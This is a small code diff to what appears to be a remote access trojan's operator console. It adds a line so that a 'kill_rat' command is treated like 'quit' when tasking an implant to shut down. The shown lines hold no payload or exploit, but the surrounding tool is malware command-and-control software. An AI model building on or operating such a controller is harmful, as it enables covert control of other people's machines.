@@ -210,6 +210,7 @@ while True:
             elif(inp):
                 if(inp == "quit" or inp == "kill_rat"):
                     print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
+                    inp = "quit"
                 else:
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
 
